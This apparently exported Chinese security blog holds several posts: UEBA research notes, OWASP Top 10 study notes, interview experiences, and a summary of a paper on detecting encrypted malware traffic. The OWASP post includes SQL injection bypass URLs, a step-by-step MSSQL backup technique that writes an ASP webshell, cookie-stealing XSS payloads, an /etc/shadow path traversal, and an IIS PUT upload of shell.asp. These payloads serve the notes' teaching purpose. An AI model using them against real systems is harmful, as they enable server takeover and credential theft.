    <content type="text"><![CDATA[​ 本文重点介绍UEBA概念、UEBA在国内外各大厂商的引用情况、机器学习技术在UEBA产品中如何进行应用等方面来对UEBA介绍，作为近段时间UEBA相关工作调研的总结。 UEBA​ UEBA用户实体行为分析， UEBA的核心点1.跨越SIEM/ROC产品，UEBA产品考虑更多的数据源。 ​ 从网络设备、系统、应用、数据库和用户处收集数据,有更多的数据，是其成功的条件之一。 2.数据驱动，但并不是单纯依靠数据驱动。一般都是数据驱动+专家驱动的混合系统。 单纯的数据驱动的问题： ​ 1.在学习之处很难拿到十分完善的数据，每当有新的数据源都需要重新进行学习，对于工程化来说是一场灾难 ​ 2.增加features很难做到快速部署 ​ 3.机器学习的到的结果是黑盒，不能解释说明，因此用户很难直接根据机器学习的结果直接进行响应和判别 3.并不是单纯的依靠机器学习，而是机器学习和统计学习相结合。 异常主要来源于两个方面： ​ 1.统计特征。例如用户访问文件夹数量异常、是否第一词访问某个较敏感的文件夹等 ​ 2.可以输出确信度很高的机器学习结果。如DGA域名机器学习检测结果 异常并不会直接给用户告警，而是作为下一步机器学习的元数据features，根据这些features再利用及机器学习模型快速确定不同features对应的风险值，风险值大于一定的阈值才会进行告警。 4.必须针对特定的应用场景才能起到很好的效果 各大厂商应用情况和业内共识常用解决的问题 1.账号失陷检测 2.主机失陷检测 3.数据泄漏检测 4.内部用户滥用 5.提供事件调查的上下文 UEBA建立的关键点 1.定义需要解决的风险场景 2.采集高质量多种类的数据 3.专家驱动和数据驱动相结合 4.其他系统平台进行集成 内部威胁检测 1.基于历史登录行为异常检测 2.基于同组成员分析判别文件拷贝行为违反DLP(数据泄露防护) 3.是否存在上传敏感行为 UEBA建立流程： 1、通过使⽤深度学习和建模技术，⼚商给异常检测模型（即⽆监督式模型）提供训练数据，使模型能够决定哪些变量对分析⽽⾔⾮常重要。这就是所谓的特征抽取过程。 2、接着，异常检测模型将识别出排在前列的异常值，发送给安全⼈员进⾏评审和标识，例如，算作“好的”或“坏的”事件。（发送多少异常值给安全⼈员取决于他们评审的能⼒。） 3、这个标识过程将被填充到监督式学习模块中，构建监督式模型。随着新标识不断增加，此模型也将持续得到优化和验证。 4、⼀旦监督式模型经过优化和测试，将会被⽴即部署，⽤来预测输⼊数据。根据⽤户设置的⻛险阈值以及⽤户的评审能⼒，向⽤户发送所预测到的威胁。5、随着数据不断更新，以上2到4步会继续重复。 业界应用情况瀚斯科技应用场景：企业内部 核心思想：1.企业内部的管理相对规范，员工行为轨迹有迹可循 ​ 2.不应该过分强调算法，为各个应用场景量身定做更重要 ​ 3.规则、黑白名单、机器学习协同工作 部署方式：与 SIEM/态势感知平台进行结合，将其采集到的行为类数据，应用系统日志、人员/权限数据导入 UEBA 分析引擎中进行实时处理。 实例 内部员工窃取敏感数据 ​ 通过 DLP 日志和流量分析导致账号异常的具体行为，发现内部高权限账号10月22号拷贝自己简历，10月23号凌晨1点大量拷贝这个工作目录下的合作项目材料，涉及财务报表、项目管理月报、资产负载表等累计 540 份。 异常特征包括： ​ 1.高权限用户是否存在拷贝简历行为(可能存在拷贝简历出卖信息跳槽风险) ​ 2.对高权限用户日常访问工作目录进行记录，日常访问、拷贝、删除财务报表、项目管理月报、资产负载表等文件的个数建立日常行为基线(根据全部同一个群组的用户的最高次数) 启明星辰应用场景： 核心思想：1.UEBA并不是安全分析的全部，仅仅是交互式安全分析的一个环节 ​ 2.行为分析要与规则分析紧密结合，行为分析要充分利用情境(Context)数据，包括情报、地理位置信息、漏洞、身份信息和业务属性等。 两种异常行为分析的方式 1.建立异常行为模型 ​ 针对特定种类的攻击行为，根据人工经验构建一攻击行为指标，基于行为指标简历机器学习模型，从而识别异常行为。 ​ 缺陷：需要对攻击有充分的理解 2.建立正常行为模型 ​ 针对波保护对象进行实体行为进行”画像”，建立一套对实体行为刻画的指标，基于这些指标简历及机器学习模型，通过数据与正常的模式的偏离程度来识别异常。 思科​ 有安全分析报告，没法下载，论文不翻墙没找到，下周我先看看能不能找个可用的vps翻个墙出去找找 机器学习在UEBA中的应用1.非监督学习​ 非监督学习主要应用在异常检测阶段通过聚类发现异常和划分群组。例如将数据使用Kmeans进行聚类，然后根据所属类别元素的大小确定群组风险大小，通过DBSCAN发现异常点等。 2.监督学习​ 监督学习主要用于将各个子模型检测的异常进行汇总，然后采用监督学将各个异常结果进行综合，确定是否粗发报警。 这里各家都没有特别具体的用法，都比较含蓄，下周翻墙去看看论文上有没有这方面的研究 总结1.UEBA中异常主要是通过统计分析、其他安全产品结果、非监督学习等方式来触发异常，而报警可以通过有监督学习和人工设定阈值的方式。 2.异常常常由各种统计模型、基线模型产生，而由产生的异常则作为特征交给机器学习模型来进行监督学习，从而确定哪些将产生告警。 3.应用场景常常是在使用UEBA系统产生异常和告警，对告警内容进行可视化展示，安全人员查看先关内容确定是否进行响应。 ​]]></content>
      <tags>
        <tag>安全</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[OWASP_TOP10]]></title>
    <url>%2F2019%2F07%2F26%2FOWASP-TOP10%2F</url>
    <content type="text"><![CDATA[​ OWASP全称Open Web Application Security Project，即开源应用程序安全项目。OWASP TOP为该项目每年发布的最具权威的就是其”十大安全漏洞列表”。 1.注入​ sql注入等 ​ 危害：导致数据丢失或数据破坏 常见混淆方式： 1.使用注释来进行截断 http://victim.com/news.php?id+un/*//ion+se/*/lect+1,2,3— 2.变换大小写 http://victim.com/news.php?id=1+UnIoN SeLecT 1,2,3— 3.替换关键词(将关键词插在关键词中) http://victim.com/news.php?id=1+UNunionION+SEselectLECT+1,2,3-- 解决方法： 1.最佳方法：采用sql语句预编译和绑定变量 ​ 采用了PreparedStatement，就会将sql语句：”select id, no from user where id=?” 预先编译好，也就是SQL引擎会预先进行语法分析，产生语法树，生成执行计划，也就是说，后面你输入的参数，无论你输入的是什么，都不会影响该sql语句的 语法结构了，因为语法分析已经完成了，而语法分析主要是分析sql命令，比如 select ,from ,where ,and, or ,order by 等等。所以即使你后面输入了这些sql命令，也不会被当成sql命令来执行了，因为这些sql命令的执行， 必须先的通过语法分析，生成执行计划，既然语法分析已经完成，已经预编译过了，那么后面输入的参数，是绝对不可能作为sql命令来执行的，**只会被当做字符串字面值参数**。所以sql语句预编译可以防御sql注入。 2.一些特殊情况不能sql语句预编译的，可以进行严格的输入检查，限制输入数据类型、过滤关键字、使用正则表达式限制等 sql注入方式写入webshell： 用工具对目标站直接写入一句话条件:root权限以及绝对路径 方式： ​ 1. ​ (1)创建自己的数据库 http://www.aspx-sqli.com/index.asp?id=1;create%20database%20zhong; ​ (2)先进行一次完整备份： ?id=1;backup database zhong to disk = ‘E:\wwwroot\asp_sqli’; ​ (3)创建新表：在数据库名为中的库里面创建一个新的cmd表 create table [dbo].[zhong] ([cmd] [image]); ​ (4)向cmd表中插入数据 ?id=1;insert into zhong(cmd) values(0x3C25657865637574652872657175657374282276616C7565222929253E); ​ (5)进行数据库的差异备份 ?id=1;backup database zhong to disk=’E:\wwwroot\asp_sqli\zhongqzi.asp’ WITH DIFFERENTIAL,FORMAT; ​ (6)菜刀连接 2.跨站脚本攻击​ 当应用程序在发送给浏览器的页面中包含用户提供的数据，但没有经过适当的验证或转义就会导致快粘脚本漏洞。 分类 1.反射性xss ​ 又称为非持久性跨站点脚本攻击，它是最常见的类型的XSS。漏洞产生的原因是攻击者注入的数据反映在响应中。一个典型的非持久性XSS包含一个带XSS攻击向量的链接(即每次攻击需要用户的点击)。 ​ 例： 正常发送消息： ​ http://www.test.com/message.php?send=Hello,World！ 接收者将会接收信息并显示Hello,Word 非正常发送消息： ​ http://www.test.com/message.php?send=alert(‘foolish!’)！ 接收者接收消息显示的时候将会弹出警告窗口 2.存储型xss ​ 又称为持久型跨站点脚本，它一般发生在XSS攻击向量(一般指XSS攻击代码)存储在网站数据库，当一个页面被用户打开的时候执行。每当用户打开浏览器,脚本执行。持久的XSS相比非持久性XSS攻击危害性更大,因为每当用户打开页面，查看内容时脚本将自动执行。 ​ 例： 留言板表单中的表单域： 正常操作： ​ 用户是提交相应留言信息；将数据存储到数据库；其他用户访问留言板，应用去数据并显示。 非正常操作： ​ 攻击者在value填写alert(‘foolish!’)或者html其他标签（破坏样式。。。）、一段攻击型代码】； 将数据存储到数据库中； ​ 其他用户取出数据显示的时候，将会执行这些攻击性代码 3.DOM型xss ​ 当用户能够通过交互修改浏览器页面中的DOM(DocumentObjectModel)并显示在浏览器上时，就有可能产生这种漏洞，从效果上来说它也是反射型XSS。 通过修改页面的DOM节点形成的XSS，称之为DOMBasedXSS。 前提是易受攻击的网站有一个HTML页面采用不安全的方式从document.location 或document.URL 或 document.referrer获取数据（或者任何其他攻击者可以修改的对象）。 例： 欢迎页面中name是截取URL中get过来的name参数 正常操作： http://www.vulnerable.site/welcome.html?name=Joe 非正常操作： http://www.vulnerable.site/welcome.html?name=alert(document.cookie) 危害：攻击者能够在受害者浏览器中执行脚本以及劫持用户会话、迫害网站、插入恶意内容等 防范 1.将重要的cookie设置为http only(这样Javascript 中的document.cookie语句就不能获取到cookie了) 3.过滤或移除特殊的Html标签， 例如: , , &lt; for &lt;, &gt; for &gt; 3.过滤JavaScript 事件的标签。例如 “onclick=”, “onfocus” 等等 xss经常利用的部分分别在哪里进行解码 HTML解释器：html对标记之间的内容 实体字符解码 js解释器：javascript:标记后面的内容 unicode解码 url解释器：要填入url的位置，都会交给url解释器进行解释 url解码 常见混淆： 1.在属性值得部分进行字符串编码(标签和属性名不能进行编码) ​ 例如： ​ 被解释后为,可以弹窗。 ​ 利用点：当浏览器接受到一份HTML代码后，HTML解释器会对标签之间（xxx等，除外)、标签的属性中（）进行实体字符解码变为相应的字符。 2.对于需要进行填入url的部分使用url进行编码(标签和属性名不能进行编码) 例如： ​ (注意这里的javascript:不能被编码) ​ 被url解释器解释完后为，url中出现了javascript:，指明了后面的语句要当作js执行，所以再次把解释后的字符交给js解释器解释，可以弹窗。 ​ 利用点：利用url解释器对提交url的位置进行url解码 3.当js解释器在标识符名称(例如函数名，属性名等等)中遇到unicode编码会进行解码，并使其标志符照常生效。 例如： \u0061\u006c\u0065\u0072\u0074(1) ​ 解码后为alert(1),一样可以弹窗 利用点:当js解释器在标识符名称(例如函数名，属性名等等)中遇到unicode编码会进行解码，并使其标志符照常生效 为什么常常将DOM型xss单独列出？DOM型xss和其他两种有什么区别？ 因为DOM型主要是由于浏览器解析机制导致的，不需要服务器进行参与，而剩余两种都是需要服务器响应参与 设置了cookie 为http only，xss还有什么方法可以获取到cookie？ 1.php类型的网站可以用phpinfo() 2. 3.跨站请求伪造(CSRF)​ CSRF，全称为Cross-Site Request Forgery，跨站请求伪造，是一种网络攻击方式，它可以在用户毫不知情的情况下，以用户的名义伪造请求发送给被攻击站点，从而在未授权的情况下进行权限保护内的操作。具体来讲，可以这样理解CSRF。攻击者借用用户的名义，向某一服务器发送恶意请求，对服务器来讲，这一请求是完全合法的，但攻击者确完成了一个恶意操作，比如以用户的名义发送邮件，盗取账号，购买商品等等。 原理 Web A为存在CSRF漏洞的网站，Web B为攻击者构建的恶意网站，User C为Web A网站的合法用户。 ​ 用户C打开浏览器，访问受信任网站A，输入用户名和密码请求登录网站A； 在用户信息通过验证后，网站A产生Cookie信息并返回给浏览器，此时用户登录网站A成功，可以正常发送请求到网站A；并且，此后从用户浏览器发送请求给网站A时都会默认带上用户的Cookie信息； ​ 用户未退出网站A之前，在同一浏览器中，打开一个TAB页访问网站B； 网站B接收到用户请求后，返回一些攻击性代码，并发出一个请求要求访问第三方站点A； ​ 浏览器在接收到这些攻击性代码后，根据网站B的请求，在用户不知情的情况下携带Cookie信息，向网站A发出请求。网站A并不知道该请求其实是由B发起的，所以会根据用户C的Cookie信息以C的权限处理该请求，导致来自网站B的恶意代码被执行 CSRF必须步骤 1.用户访问可信任的网站并产生了cookie 2.用户在访问A站点时没有退出，同时访问了恶意站点B 防范 1.给每一个HTTP添加一个不可预测的令牌，并保证该令牌对每个用户会话来说是唯一的，并且不再URL中进行显示 2.验证HTTP referer字段 XSS和CSRF的区别 1.能否cookie获取： ​ CSRF无法获取用户的cookie，只是诱导受害者使用被服务器信任的cookie取执行攻击者构造好的请求 ​ XSS可以获取cookie 2.漏洞利用前提 ​ CSRF攻击需要用户已经对登陆了目标网站 ​ XSS不需要用户已经登陆了目标网站 3.原理区别 ​ CSRF是利用网站本身的api去进行攻击 ​ XSS是向网站中获请求中嵌入js代码，通过执行js进行攻击 4.其他安全问题waf和ips的绕过区别和一些技巧 2.失效的身份认证和会话管理​ 身份认证：身份认证最常用于系统登录，形式一般为用户名和密码登录方式，在安全性要求较高的情况下，还有验证码、客户端证书、Ukey等 ​ 会话管理：HTTP利用会话机制来实现身份认证，HTTP身份认证的结果往往是获得一个令牌并放在cookie中，之后的身份识别只需读授权令牌，而无需再次进行登录认证 攻击原理 开发者通常会建立自定义的认证和会话管理方案。但与身份认证和回话管理相关的应用程序功能往往得不到正确的实现，要正确实现这些方案却很难，结果在退出、密码管理、超时、密码找回、帐户更新等方面存在漏洞，这就导致了攻击者攻击者破坏密码、密钥、会话令牌或攻击其他的漏洞去冒充其他用户的身份（暂时或永久的） 产生原因 1.用户的身份认凭证(url中的id、cookie等)没有使用哈希或加密保护 2.会话ID暴露在URL里 3.会话ID没有超时限制，或超时限制不合理 4.认证凭证存在规律，可以直接通过猜测获得 防范 1.cookie和url中的身份凭证进行加密 2.设置密码和会话的有效期，并强制使用强密码 3.账号密码以密文形式传输在数据中hash存储 4.不安全对象的直接引用​ 不安全的直接对象引用，也被称IDOR。IDOR允许攻击者绕过网站的身份验证机制，并通过修改指向对象链接中的参数值来直接访问目标对象资源，这类资源可以是属于其他用户的数据库条目以及服务器系统中的隐私文件等等。 常见攻击形式： 目录遍历 ​ 假设 Web 应用程序允许为要呈现给用户存储在本地计算机上的文件。如果应用程序不验证应访问哪些文件，攻击者可以请求其他文件系统上的文件和那些也会显示。 例如，如果攻击者通知 URL: https://oneasp.com/file.jsp?file=report.txt 攻击者可以修改文件参数使用目录遍历攻击。他修改的 URL: https://oneasp.com/file.jsp?file=**../../../etc/shadow** 这样 /etc/阴影文件返回并且呈现由 file.jsp 演示页面容易受到目录遍历攻击。 开方重定向 ​ Web 应用程序有一个参数，允许其他地方的用户重定向到网站。如果此参数不实现正确使用白名单，攻击者可使用这一网络钓鱼攻击引诱到他们选择的站点的潜在受害者。 例： 例如，如果攻击者通知 URL:https://oneasp.com/file.jsp?file=report.txt 攻击者可以修改文件参数使用目录遍历攻击。他修改的 URL:https://oneasp.com/file.jsp?file=**../../../etc/shadow** 防范： 1.验证用户输入的url请求，拒绝包含../和./的请求 2.锁定服务器上的 5.安全配置错误​ 良好的安全性需要为应用程序、框架、应用服务器、web服务器、数据库服务器和平台定义和部署安全配置。默认值通常是不安全的。 攻击案例 案例#1：应用程序服务器管理员控制台自动安装后没有被删除。而默认帐户也没有被改变。攻击者在你的服务器上发现了标准的 管理员页面，通过默认密码登录，从而接管了你的服务器。案例#2：目录列表在你的服务器上未被禁用。攻击者发现只需列出目录，她就可以找到你服务器上的任意文件。攻击者找到并下载所有已编译的Java类，她通过反编译获得了所有你的自定义代码。然后，她在你的应用程序中找到一个访问控制的严重漏洞。案例三： 1）打开IISPutScanner.exe应用扫描服务器,输入startIP192.168.1.119和endIP192.168.1.119(也可以对 一个网段进行设置) ,点击Scan 进行扫描,PUT为YES服务器类型为IIS ,说明可能存在IIS写权限漏洞。 （2）使用iiswrite.exe应用,使用此软件来利用IIS写权限漏洞上传一句话木马。 1.以PUT方式上传22.txt文件。检查目标网站是否有test.txt文件显示出错,说明没有 test.txt文件,那么我们可以请求的文件名可以为22.txt。域名为192.168.1.119,点击提交 数据包。重新访问 192.168.1.119/test.txt显示上传内容,说明上传成功。 2.使用COPY方式复制一份数据,数据的文件名为shell.asp,点击提交数据。使用浏览 器访问http://192.168.1.119/shell.asp发现访问成功,没有出错,说明复制成功。 3.打开中国菜刀,鼠标右键点击添加输入地址http://192.168.1.119/shell.asp密码为chop per点击添加。双击打开连接,获取到服务器的目录,看到有上传的shell.asp文件 和 test.txt文件。 防范 1.了解并及时部署每个环境的软件更新和补丁信息 2.统一出错处理机制，错误处理会向用户显示堆栈跟踪获其他归于丰富的错误消息信息。 3.使用提供有效分离和安全性强大的应用程序架构 6.敏感信息泄露​ 常见的漏洞是应该进行加密的数据没有进行加密。使用加密的情况下常见问题是不安全的密钥和使用弱算法加密。 敏感数据包括哪些？ 1.个人信息 2.网站登录用户名、密码、SSL证书、会话ID、加密使用的秘钥等 3.Web服务器的系统类型、版本、Web服务器信息、数据库信息等 防范 1.个人信息数据加密存储 2.敏感数据的传输使用SSL加密传输 3.应用程序出错的信息不直接显示在页面上，统一错误页面 7.缺少功能级的访问控制​ 功能级的保护是通过系统配置管理的，当系统配置错误时，开发人员必须做相应的代码检查，否则应用程序不能正确的保护页面请求。攻击者就是利用这种漏洞访问未经授权的功能模块。 ​ 很多系统的权限控制是通过页面灰化或隐藏URL实现的，没有在服务器端进行身份确认和权限验证，导致攻击者通过修改页面样式或获取隐藏URL，进而获取特权页面来对系统进行攻击，或者在匿名状态下对他人的页面进行攻击，从而获取用户数据或提升权限。 ​ 此类问题主要是系统在开发或者设计阶段，没有考虑攻击场景，以为看不到就是安全的，这种系统说白了是服务端没有进行权限控制和身份校验，才给了攻击者可乘之机。 防范 1.设置严格的权限控制系统，尤其是服务端必须进行权限和身份验证 2.默认缺省情况下，应该拒绝所有访问的执行权限 3.对于每个功能的访问，都要有明确的角色授权，采用过滤器的方式校验每个请求的合法性]]></content>
      <tags>
        <tag>面试</tag>
        <tag>安全</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[矩形搜索、遍历相关算法]]></title>
    <url>%2F2019%2F07%2F25%2F%E7%9F%A9%E5%BD%A2%E6%90%9C%E7%B4%A2%E3%80%81%E9%81%8D%E5%8E%86%E7%9B%B8%E5%85%B3%E7%AE%97%E6%B3%95%2F</url>
    <content type="text"><![CDATA[1.矩阵中的路径 请设计一个函数，用来判断在一个矩阵中是否存在一条包含某字符串所有字符的路径。路径可以从矩阵中的任意一个格子开始，每一步可以在矩阵中向左，向右，向上，向下移动一个格子。如果一条路径经过了矩阵中的某一个格子，则之后不能再次进入这个格子。 例如 a b c e s f c s a d e e 这样的3 X 4 矩阵中包含一条字符串”bcced”的路径，但是矩阵中不包含”abcb”路径，因为字符串的第一个字符b占据了矩阵中的第一行第二个格子之后，路径不能再次进入该格子。 关键点：1.该问题很容易可以看出是回溯问题，在回溯问题上最好不要使用直接的队列删除]]></content>
  </entry>
  <entry>
    <title><![CDATA[常见文件解压命令]]></title>
    <url>%2F2019%2F07%2F25%2F%E5%B8%B8%E8%A7%81%E6%96%87%E4%BB%B6%E8%A7%A3%E5%8E%8B%E5%91%BD%E4%BB%A4%2F</url>
    <content type="text"><![CDATA[Rar文件解压1.查看不解压1unrar l filename.rar 2.带路径解压1unrar x filename.rar 3.不带路径解压(全部在文件夹内的内容全部解压到当前目录)1unrar e filename.rar]]></content>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[秋招面经]]></title>
    <url>%2F2019%2F07%2F23%2F%E7%A7%8B%E6%8B%9B%E9%9D%A2%E7%BB%8F%2F</url>
    <content type="text"><![CDATA[作业帮​ 作为秋招的首个面试，时间在晚上7点到9点半，面试过程中听到边上大佬在介绍工作时间，大小周制，早10点到晚9点，标准的互联网工作制吧，整体感觉还行，一次面了两面，感觉已经凉凉了，下面是面经： 一面​ 上来直接拿一张纸直接开始写代码：一道题分三问：(1)声明数据结构，存储节点 (2)给定前序遍历序列，；例如：adcv*dsf，”\代表空”，恢复二叉树 (3)得到后续遍历序列 题目不难，但是第二问脑袋抽筋了，想了很久才写出来。。。 接下来是一道决策求期望的问题，给一枚色子投到几就能够获得几枚金币，第一次投掷后可以选择是否重新投掷，问如何进行决策才能获得最大期望以及最大期望值。 二面​ 问项目，感觉对项目并不是很感兴趣甚至有点嫌弃…，不说了直接上问题。主要写了四道题吧，第一个机器人寻路问题，在一个m*n的网格中，有多少条路线可以走到终点，好像是剑指offer上的题目吧,递归很简单。 第三个问题是一个概率问题，就是5枚硬币，一枚正面为字背面为人，两枚正反都为人，两枚正反都为字，随机投一枚硬币发现朝上的是字，问另一面也是字的概率，一个典型的贝叶斯估计问题。第四个合并两个二叉搜索树，思路就是先中序遍历两个序列存在数组中，然后合并两个排序数组，在重建二叉搜索树，但是！这里中序遍历的非递归我居然没写出来！！！。 百度 大搜一面​ 面试官说的两句话还是挺让人印象深刻的，做模型关键点不在模型算法上，更关键的应该是数据标注和特征提取，之前一直觉得机器学习才是这样，深度学习更主要的模型结构的设计，基本上没有怎么注意特征提取、数据标注，尤其是数据标注，面试官说在真正的大数据场景下是没法使用规则、人工标注的，更多的还是需要采用一定的高级自动化方式。 ​ 编程题：1.求非递减数组各个元素平方后组成的非递减数组 ​ 2. ​ 两个场景题目： 1.两个文件中存储两个表，表1中存储id,name,locate,表2中存储id,phone，如何合并两个表（内存不支持两个表完全读入）？ 他最后的提示是map-reduce思想 2.一个衡量两个query query1和query2语义是否相同的项目，如何进行数据标注，模型结构设计？ ​ 数据标注可以结合行为数据进行标注，这种准确度很高，不太需要再去人工调整 直接凉凉… 百度 安全​ 超长时间面试，从中午11点直接三面面到了下午4点，晕… 希望能有个好结果吧 一面​ 一上来直接拿了一张纸，上面有3到编程题，3选2，题目都很简单，一道获取数组整数下界，另一道不记得了，然后是算法型题目，记得的1.什么是生成模型、判别模型，两者的应用场景 2.有监督学习黑白样本不均衡对建模有什么影响？怎么去解决？ 3.解释什么是概率什么是似然，二者分别在什么情况下进行应用？ 4.xgbt是如何进行剪枝的？ 5.模型的评价指标都有什么？计算公式 6.三种集成学习都是什么？具体介绍一下是如何进行集成的 然后问了一些模型方面的问题 word2vec原理，有哪两种？优化方式有哪两种？这里问到了具体的word2vec是怎么进行训练的，不是很清楚具体细节，答的不太好 还有就是BN在训练和预测时有什么不同 LR和决策树分别用于什么情况？决策树更适用连续数据还是离散数据？这里我答的是离散，面试官提示说说连续，其实还不是很懂 Kmeans、高斯混合模型 其他就是项目相关的问题的了，大体上就是这些，整体感觉确实很偏向算法基础 二面​ 这一面主要是问项目的一些细节，包括LSTM、Bert等一些细节问题然后让写了一道算法题，一个矩阵，从左上角走到右下叫最小的路径。 三面​ 前后来了两个面试官，一个是大数据方向的，和我聊了聊我说对大数据没有太深的了解就换了面试官，这次的面试官看样子像个领导，主要就是聊项目、应用等，最后介绍了下他们这边的情况还有这个岗位的情况 ​ 9月底才有消息，等的我真是怕了 阿里云安全一面 ​ 下午突然接到的电话面大约30min，面试官人很好，首先就介绍了他们这边的工作，然后才让我做的自我介绍，自我介绍在，项目聊了很久，然后就是模型、web安全、协议、Linux四个方面基础知识的一些问题，模型方面问决策树是如何决定节点怎么进行分裂的？SVM的核函数是做什么的？ web安全方面：什么是csrf？如何进行防御？ 什么是xss都有哪几类？DOM型和其他两种类型有什么不同？ 协议方面：是否了解traceroute,整个路径跟踪过程是如何实现的？ ​ 全部都面完以后才知道这个面试官就是我以后的leader，人真的很好，感觉很幸运。 二面 ​ ​ 最后知道面试官是一个另一个组的老大，花名很独特：东厂 三面 HR面 ​ HR面是提前约的视频面，面试过程半小时左右，主要是聊了聊了一些规划以及对安全的看法什么的，其中有几个让我印象比较深刻的问题：1.实习的时候我看到你还投了阿里这边的非安全岗位，当时是怎么考虑的呢？ 后来HR告诉我在这里可能看出我至少在当时职业规划还不是很明确，还好我回答的还算不错，巧妙化解了这个问题 2.平时都通过什么进行学习，在安全领域有什么比较崇拜的人？正好我一直关注的大佬都在阿里云，HR也很兴奋，跟我说正好你说的都在这里，开心~ 有什么 3.还有就是问offer情况，问那些这些公司的对比 总裁面 ​ HR面完一个月在正式出结果之前，忽然通知要加一个总裁面，提前去视频会议室看了一下，居然真的是阿里云安全总裁肖力，心里慌得一批，还好最好肖老板因为云栖大会临时换了人，还是一个安全团队的老大：木瓜。面试过程整体比较难，具体细节记得不是很清楚了，除了项目以外，有一些大方向上的问题，比如安全趋势了解、区块链的了解的等等，其次还有一些传统安全相关的了解，问挖洞实践、安全竞赛实践等。 ​ 惊险通过，开心得不得了！(面试持续两个月，8.1开始面试，9.28才收到意向书，然而我还是阿里云安全最早的意向书) 美团安全部一面 ​ 面的自我感觉还可以，但是直接凉了，挺迷茫的 腾讯安全部一面​ 然后是数据库相关的问题，首先是问有两张表如何进行进行合并 还有就是一个topk问题，我回答了堆排，利用大根堆的方式，但是他问能不能用小根堆，我也答了一种取负值然后进小根堆的方式，他说这个和大根堆有什么区别吗？ 让我看能不能快排类似的思想 另外一道题目是map reduce的比较简单，分布在多台主机上的多个文件，如何根据找出topk个数据 ​ 总体来说面试难度不难，但是面试体验很差，面试官态度一直就不是很好，而且每道题必须要我想出和他一样的想法，那个topK大根堆、小根堆、快排效率上有什么区别吗，非要按照他的那个快排，感觉对腾讯的好感-1 二面 ​ 其他的问题回答的都还比较顺利，只有一个问题没有回答的很好，一道安全场景题：怎么去识别非正常登陆，例如撞库行为，这个问题后来发现阿里云的安全团队也有做过类似的事情，看来是一个比较关键的问题 三面 ​ 和面试官聊的还不错，但是因为在深圳所以拒绝了 京东金融推荐算法一面​ 在一个酒店里的面试，形式和360类似，但是每天只面一场，面试的部门倾向于金融推荐类，面试官人很好，问的问题最后都会耐心解答最优方法，整体面试感觉真的很nice！ 下面是面到的一些问题：对于特别大的离散特征如id特征怎么进行使用？直接one-hot就有向量维度过高的问题 1.使用PCA、LDA进行降维，这种由于向量过于稀疏，不太能使用 2.embedding 是一个高维稀疏向量降维的最佳方法 面试官追问，你说的这个embedding是随机初始化吧？能不能进行考虑一下怎么进行一下预训练？ 其实可以通过对利用各个id的前后的点击情况做类似Word2vec的预训练 另一个比较核心的问题是模型正负样本比例不均衡的时候用什么指标？在进行过采样后什么时候可以直接利用模型结果？什么时候需要重新进行换算？ 正负样本不均匀的时候最好使用的指标当然是AUC，也可以采用精确率、召回率综合考量 对于排序等只关注先后顺序的任务，可以直接使用预测结果，而对一些带阈值的分类问题，就需要对概率进行重新转化一下 二面 ​ 整个面试挺奇怪的，面试官问的问题基本上全部都会打出来了，但是还是被挂掉了，不知道是什么操作 360安全研究院​ 一共面了3面，具体面了什么都忘了，只记得面的很好，但是过了一个月了，还是没有消息，不知道是不是凉了。。。 互联网秋招就这样结束了，剩下这段时间就是专心做毕设和尝试在找找国企。 ​ ​]]></content>
      <tags>
        <tag>面经</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[思科加密流量检测]]></title>
    <url>%2F2019%2F07%2F15%2F%E6%80%9D%E7%A7%91%E5%8A%A0%E5%AF%86%E6%B5%81%E9%87%8F%E6%A3%80%E6%B5%8B%2F</url>
    <content type="text"><![CDATA[论文：《Identifying Encrypted Malware Traffic with Contextual Flow Data》 核心点： 1.传统的流量特征提取方式一般聚焦在数据包大小和时间有关的参数上；本文拓充了特征提取范围，运用好到了完整的TLS我输数据包、同TLS握手数据包同一来源的DNS数据流和5分钟窗口内的HTTP数据流(后两者被称为contextual flow) contextual flow：同TLS握手数据包同一来源的DNS数据流和5分钟窗口内的HTTP数据流 contextual flow特征分析角度​ 1.DNS流 ​ 主要分析从DNS服务器中返回带有一个地址的响应以及和这个地址相关联的TLL值。 ​ 2.HTTP流 ​ 主要分析HTTP header中的各种属性。 ​ 3.TLS流 ​ 握手包中提供的信息。 特征来源1.TLS流​ TLS流在交互之初是不加密的，因为其需要和远程服务器进行握手。我们可以观测到的未加密TLS元数据包括clientHello和clientKeyExchange。从这些包的信息中，我们可以推断出客户端使用的TLS库等信息。从这些信息中，我们可以发现，良性流量的行为轨迹与恶意流量是十分不同的。 ​ 客户端方面 Offered Ciphersuites:恶意流量更喜欢在clientHello中提供0x0004(TLS_RSA_WITH_RC4_128_MD5)套件，而良性流量则更多提供0x002f(TLS_RSA_WITH_AES_128_CBC_SHA)套件 Advertised TLS Extensions:大多数TLS流量提供0x000d(signature_algorithms)，但是良性流量会使用以下很少在恶意流量中见到的参数：0x0005 (status request)、0x3374 (next protocol negotiation)、0xff01 (renegotiation info 客户端公钥：良性流量往往选择256-bit的椭圆曲线密码公钥，而恶意流量往往选择2048-bit的RSA密码公钥。 **服务端方面** ​ 我们能够从serverHello流中得到服务端选择的Offered Ciphersuites和Advertised TLS Extensions信息。 证书链长度：在certificate流中，我们能够得到服务端的证书链，长度为1的证书链中70%都来自恶意流量的签名，0.1%来自良性流量的自签名 2.DNS流​ 恶意软件往往使用域名生成算法来随机生成域名（DGA），这是一个明显区别于普通流量的行为。 3.HTTP流 请求报头：良性流量最常用的属性为User-Agent，Accept-Encoding和Accept-Language。 响应报头：恶意流量最常用的属性为Server、Set-Cookie和Location；良性流量最常用的属性为Connection、Expires和Last-Modified 属性观察值： ​ Content-Type：良性最常用的为image／\*,恶意流量最常用的是text／\* ​ MIME:恶意流量常常为text／html；charset=UTF-8以及text／html；charset=utf-8 ​ User-Agent：恶意流量常常为Opera/9.50(WindowsNT6.0;U;en)、Mozilla／5.0或Mozilla／4.0；而良性流量通常为Windows或OS X版本的Mozilla／5.0。 实验效果 ​ 虽然检测准确率是99.9%,但是由于样本极度不均衡，因此准确率并不具有很大的参考意义。而再看上表中的检出率最高的也只有83%，因此效果并不理想。]]></content>
      <tags>
        <tag>安全</tag>
        <tag>入侵检测</tag>
        <tag>论文阅读</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[深度学习——transformer XL]]></title>
    <url>%2F2019%2F06%2F25%2F%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E2%80%94%E2%80%94transformer-XL%2F</url>
